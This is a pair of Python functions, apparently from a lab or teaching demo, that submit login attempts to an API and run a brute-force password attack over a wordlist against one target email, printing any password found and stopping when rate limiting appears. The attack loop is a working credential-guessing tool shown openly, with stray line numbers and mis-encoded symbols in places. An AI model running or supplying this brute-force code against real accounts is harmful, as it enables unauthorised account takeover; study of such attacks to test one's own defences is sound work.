```python

def attempt_login(email: str, password: str) -> dict:
         """
         Attempt to login with given credentials
        """
         start_time = time.time()
     
         try:
             response = requests.post(
                 API_URL,
                 json={"email": email, "password": password},
                 timeout=10
             )
             elapsed = (time.time() - start_time) * 1000  # Convert to ms
     
             if response.status_code == 200:
                 return {
                     "success": True,
                     "status_code": 200,
                     "message": "Login successful",
                     "time_ms": elapsed,
                     "data": response.json()
                 }
             else:
                 return {
                     "success": False,
                     "status_code": response.status_code,
                     "message": response.json().get("error", "Login failed"),
                     "time_ms": elapsed
                 }
     
         except requests.exceptions.ConnectionError:
             print(f"Error: Cannot connect to {API_URL}")
             print(f"Make sure the backend server is running!")
             sys.exit(1)
         except Exception as e:
             return {
                 "success": False,
                 "status_code": 0,
                 "message": str(e),
                 "time_ms": 0
             }
     
```

```python
def brute_force_attack(email: str, password_list: list, delay: float = 0.0, verbose: bool = True) -> str :
    """
    95     Perform brute force attack
    96 
    97     Args:
    98         email: Target email address
    99         password_list: List of passwords to try
   100         delay: Delay between attempts (seconds)
   101         verbose: Print detailed output
   102 
   103     Returns:
   104         Successful password or None
   105     """
    total_attempts = len(password_list)
    successful_password = None
    attempts_made = 0
    total_time_start = time.time()
    
    print(f"Starting brute force attack...")
    
    for i, password in enumerate(password_list, 1):
            attempts_made += 1
    
            # Attempt login
            result = attempt_login(email, password)
    
            # Display progress
            if verbose:
                status_symbol = "âœ“" if result["success"] else "âœ—"
    
                print(f"[{i}/{total_attempts}] {status_symbol} " f"Testing: '{password[:20]}{'...' if len(password) > 20 else ''}' "
                      f"({result['time_ms']:.0f}ms) - {result['message']}")
    
            # Check if successful
            if result["success"]:
                successful_password = password
                print(f"\nðŸŽ¯ PASSWORD FOUND!")
                print(f"Password: {password}")
                print(f"Attempts: {attempts_made}/{total_attempts}")
                print(f"Time taken: {time.time() - total_time_start:.2f} seconds")
                break
    
            # Check for rate limiting
            if result["status_code"] == 429:
                print(f"\nâš ï¸  Rate limiting detected! âš ï¸")
                print(f"The server is blocking our requests.")
                print(f"This is GOOD - it's a security measure to prevent brute force attacks.")
                break
    
            # Delay between attempts
            if delay > 0 and i < total_attempts:
                time.sleep(delay)
    
    total_time = time.time() - total_time_start
    
        # Print summary
    print(f"\n{'=' * 70}")
    print(f"ATTACK SUMMARY")
    print(f"{'=' * 70}")
    print(f"Total attempts: {attempts_made}/{total_attempts}")
    print(f"Total time: {total_time:.2f} seconds")
    print(f"Average time per attempt: {(total_time/attempts_made)*1000:.0f}ms")
    print(f"Passwords per second: {attempts_made/total_time:.2f}")
    
    if successful_password:
            print(f"Result: PASSWORD FOUND âœ“")
            print(f"Password: {successful_password}")
    else:
            print(f"Result: Password not found âœ—")
    
    print(f"{'=' * 70}")
    
    return successful_password
    

        
```
